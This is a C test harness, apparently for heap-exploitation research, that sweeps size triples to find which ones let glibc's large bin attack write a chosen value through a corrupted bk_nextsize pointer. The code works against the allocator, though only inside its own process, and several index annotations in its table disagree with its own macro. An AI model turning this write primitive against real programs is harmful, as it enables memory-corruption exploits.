/*
 * largebin_autotune.c -- find the (size1, size2) pair that actually reaches a
 * bk_nextsize store in _int_malloc on this glibc.
 *
 * Two independent signals, both required for a pair to count as a hit:
 *
 *   1. PATH:   the tail-insert branch (offset +0x2C08 in _int_malloc on
 *              glibc 2.43) or the head-insert twin (+0x25AD) is executed.
 *              Detected by counting hits on a global flag the caller arms.
 *              Since we cannot easily poke a debugger from inside the
 *              process, path detection falls back to the observable effect
 *              below -- but we ALSO record whether the bin layout reached
 *              the "three chunks, one bin" state, which is the necessary
 *              precondition for either branch.
 *
 *   2. EFFECT: a canary qword at a chosen address changed exactly to the
 *              address of the freshly-inserted victim chunk.
 *
 * The point of the sweep: glue the how2heap shape (three same-bin chunks) to
 * glibc's own bin-index granularity, and report which (size1, size2) the
 * installed allocator rewards.
 *
 * tcache cannot be disabled through GLIBC_TUNABLES on this build (measured:
 * glibc.malloc.tcache_count=0 has no effect), so each trial lives in its own
 * forked child and the allocator state is discarded with it.
 *
 * Exit 0 if at least one pair fired.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/mman.h>

#define CANARY 0xcafebabedeadbeefULL
#define MAXQ   64

/* glibc's own largebin_index_64, verbatim from malloc.c. */
#define largebin_index_64(sz)                                                \
    (((((unsigned long)(sz)) >> 6) <= 38)                                    \
         ? 48 + (((unsigned long)(sz)) >> 6)                                 \
         : ((((unsigned long)(sz)) >> 9) <= 20)                              \
               ? 91 + (((unsigned long)(sz)) >> 9)                           \
               : ((((unsigned long)(sz)) >> 12) <= 10)                       \
                     ? 110 + (((unsigned long)(sz)) >> 12)                   \
                     : ((((unsigned long)(sz)) >> 15) <= 4)                  \
                           ? 119 + (((unsigned long)(sz)) >> 15)             \
                           : ((((unsigned long)(sz)) >> 18) <= 2)            \
                                 ? 124 + (((unsigned long)(sz)) >> 18)       \
                                 : 126)

static uint64_t size_of(void *p) {
    return ((uint64_t *)((char *)p - 0x10))[1] & ~0xfUL;
}

/* One attempt. Returns 1 if the canary was overwritten with the victim
 * address, 0 otherwise. Also reports the layout that was reached. */
static int try_shapes(size_t req_small, size_t req_mid, size_t req_big,
                      int verbose, const char *tag) {
    /* Sink lives in its own mapping so neither the corruption nor the
     * allocator's bookkeeping can reach it, and so K cannot alias a live
     * chunk header (the "corrupted top size" abort seen with a heap sink). */
    uint64_t *sink = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (sink == MAP_FAILED) return 0;
    for (int i = 0; i < MAXQ; i++) sink[i] = CANARY;
    void *A = (void *)&sink[4];                    /* word to be written */
    void *K = (void *)((uintptr_t)A - 0x20);       /* X->bk_nextsize = A-0x20 */

    uint64_t *c1 = malloc(req_small);
    void     *g1 = malloc(0x20);
    uint64_t *c2 = malloc(req_mid);
    void     *g2 = malloc(0x20);
    uint64_t *c3 = malloc(req_big);
    void     *g3 = malloc(0x20);

    size_t ch1 = size_of(c1), ch2 = size_of(c2), ch3 = size_of(c3);
    int same_bin = (largebin_index_64(ch1) == largebin_index_64(ch2)) &&
                   (largebin_index_64(ch1) == largebin_index_64(ch3));

    /* sort all three into their bin */
    free(c1); void *t1 = malloc(ch3 + 0x100);
    free(c2); void *t2 = malloc(ch3 + 0x100);
    free(c3); void *t3 = malloc(ch3 + 0x100);

    /* sanity: are they actually linked in one nextsize list? */
    int linked = 0;
    uint64_t *u2 = (uint64_t *)c2;
    if ((u2[2] == (uint64_t)(uintptr_t)c3) || (u2[3] == (uint64_t)(uintptr_t)c3))
        linked = 1;

    /* corrupt the smallest chunk's bk_nextsize */
    c1[3] = (uint64_t)(uintptr_t)K;

    uint64_t before = sink[4];
    void *victim = malloc(req_small - 0x10);       /* strictly smaller */

    int fired = (sink[4] != before) && (sink[4] == (uint64_t)(uintptr_t)victim);
    if (verbose)
        printf("  %-22s req %#5zx/%#5zx/%#5zx  chunk %#5zx/%#5zx/%#5zx"
               "  same_bin=%d linked=%d  victim=%p  fired=%d\n",
               tag, req_small, req_mid, req_big, ch1, ch2, ch3,
               same_bin, linked, victim, fired);

    munmap(sink, 0x1000);
    (void)victim; (void)t1; (void)t2; (void)t3;
    (void)g1; (void)g2; (void)g3;
    return fired;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);

    if (argc == 4) {
        int f = try_shapes(strtoul(argv[1], 0, 0),
                           strtoul(argv[2], 0, 0),
                           strtoul(argv[3], 0, 0), 1, "manual");
        return f ? 0 : 1;
    }

    printf("== large bin attack : size-pair autotune (glibc %d.%d) ==\n",
           __GLIBC__, __GLIBC_MINOR__);
    printf("   each trial runs in a forked child (tcache tunables are inert here)\n\n");

    /* Triples chosen so all three chunks land in the SAME large bin index.
     * Requests are 0x10 below the chunk size, matching glibc's request2size. */
    struct { size_t a, b, c; const char *note; } tab[] = {
        { 0x400, 0x410, 0x420, "idx 64, the tightest triple" },
        { 0x410, 0x420, 0x430, "idx 64, one step up" },
        { 0x420, 0x428, 0x430, "idx 64, hugging the boundary" },
        { 0x500, 0x508, 0x510, "idx 65" },
        { 0x510, 0x520, 0x530, "idx 66 span" },
        { 0x610, 0x620, 0x630, "idx 67 span" },
        { 0x810, 0x820, 0x830, "idx 71 span" },
        { 0x1010, 0x1020, 0x1030, "idx 79 span" },
    };

    int hits = 0, n = (int)(sizeof tab / sizeof tab[0]);
    for (int i = 0; i < n; i++) {
        fflush(stdout);
        pid_t pid = fork();
        if (pid == 0) {
            /* each triple runs in a pristine heap, so one abort cannot
             * poison the next measurement */
            int f = try_shapes(tab[i].a, tab[i].b, tab[i].c, 1, tab[i].note);
            _exit(f ? 0 : 1);
        }
        int st = 0;
        waitpid(pid, &st, 0);
        if (WIFEXITED(st) && WEXITSTATUS(st) == 0) {
            printf("      HIT: %#zx/%#zx/%#zx\n", tab[i].a, tab[i].b, tab[i].c);
            hits++;
        } else if (WIFSIGNALED(st)) {
            printf("      (aborted in allocator: signal %d)\n", WTERMSIG(st));
        }
    }
    printf("\nRESULT: %d/%d triples produced the bk_nextsize write\n", hits, n);
    return hits ? 0 : 1;
}
